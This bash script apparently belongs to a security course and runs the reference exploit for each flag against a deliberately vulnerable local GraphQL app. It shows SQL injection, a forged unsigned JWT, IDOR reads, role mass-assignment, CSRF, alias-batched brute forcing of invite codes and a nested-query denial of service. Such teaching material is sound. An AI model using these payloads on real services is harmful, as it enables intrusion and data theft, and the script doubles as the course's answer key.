#!/usr/bin/env bash
# Build the vulnerable fork and capture every flag once (the reference exploit path for each).
cd /course/modules/m10-security/contract/vulnerable-shelfie
mvn -q package -DskipTests >/tmp/b.log 2>&1 || { grep -E 'ERROR' /tmp/b.log | head -20; exit 1; }
java -jar target/shelfie-vulnerable.jar >/tmp/app.log 2>&1 & P=$!
for _ in $(seq 80); do (exec 3<>/dev/tcp/localhost/4000) 2>/dev/null && break; sleep 0.5; done
U=localhost:4000/graphql
g() { curl -s -H 'Content-Type: application/json' "$@" $U; echo; }
q() { jq -cn --arg q "$1" '{query:$q}'; }
echo "F01"; g -d "$(q '{ __type(name: "Query") { fields(includeDeprecated: true) { name isDeprecated } } }')" | head -c 300; echo; g -d "$(q '{ debugInfo }')"
BEN=$(g -d "$(q 'mutation { login(username: "ben", password: "ben-pw") }')" | jq -r .data.login); echo "ben token ${BEN:0:20}..."
echo "F02"; g -d "$(q '{ book(id: "b7") { reviews(first: 50) { body club { id } } } }')" | grep -o 'FLAG{[^}]*}'
echo "F03"; g -d "$(q '{ node(id: "r41") { ... on Reader { email } } }')"
echo "F05"; g -d "$(q '{ club(id: "c2") { auditLog } }')"
echo "F07"; g -d "$(q "{ searchBooks(titleContains: \"zzz' union select name, secret from vault --\") { id title } }")"
NONE=$(printf '%s' '{"alg":"none"}' | base64 -w0 | tr '+/' '-_' | tr -d '=').$(printf '%s' '{"preferred_username":"root","roles":["admin"],"iss":"http://shelfie-ctf"}' | base64 -w0 | tr '+/' '-_' | tr -d '=').
echo "F08"; g -H "Authorization: Bearer $NONE" -d "$(q '{ adminSecret }')"
echo "F09"; g -d "$(q '{ review(id: "vx") { id } }')"
echo "F10"; g -H "Authorization: Bearer $BEN" -d "$(q 'mutation { updateProfile(input: {role: ADMIN}) { roles } }')"; g -H "Authorization: Bearer $BEN" -d "$(q '{ staffNotes }')"
echo "F12 ad hoc"; g -H "Authorization: Bearer $BEN" -d "$(q 'mutation { grantBadge(readerId: "r2") }')"
DOC='mutation { grantBadge(readerId: "r2") }'; H=$(printf '%s' "$DOC" | sha256sum | cut -d' ' -f1)
echo "F12 apq"; g -H "Authorization: Bearer $BEN" -d "$(jq -cn --arg q "$DOC" --arg h "$H" '{query:$q, extensions:{persistedQuery:{version:1, sha256Hash:$h}}}')"
echo "CSRF text/plain + cookie"; curl -s -H 'Content-Type: text/plain' --cookie "shelfie_token=$BEN" -d "$(q 'mutation { addReview(clubId: "c2", bookId: "b1", rating: 1, body: "csrf") { author { name } } }')" $U; echo
echo "GET mutation"; curl -s -o /dev/null -w '%{http_code}\n' -G --data-urlencode 'query=mutation { removeReview(id: "v31") }' $U
echo "F06 brute force"; for start in 0 1000 2000 3000 4000; do
  doc="mutation {"; for i in $(seq $start $((start+999))); do c=$(printf %04d $i); doc+=" a$c: joinClub(id: \"c1\", inviteCode: \"$c\") { id }"; done; doc+=" }"
  r=$(curl -s -H 'Content-Type: application/json' -H "Authorization: Bearer $BEN" -d "$(q "$doc")" $U)
  hit=$(jq -r '.data // {} | to_entries[] | select(.value != null) | .key' <<<"$r"); echo "  $start: ${hit:-none} $(jq -r '.errors[0].message // empty' <<<"$r" | head -c 120)"; [[ -n "$hit" ]] && break; done
g -H "Authorization: Bearer $BEN" -d "$(q '{ club(id: "c1") { welcomeNote } }')"
echo "stats"; curl -s localhost:4000/_ctf/stats; echo
echo "F04 slow"; time (g -d "$(q '{ clubs(first: 12) { members(first: 10) { clubs(first: 12) { members(first: 10) { clubs(first: 12) { members(first: 10) { clubs(first: 12) { name } } } } } } } }')" | head -c 200); echo
kill $P; wait $P 2>/dev/null
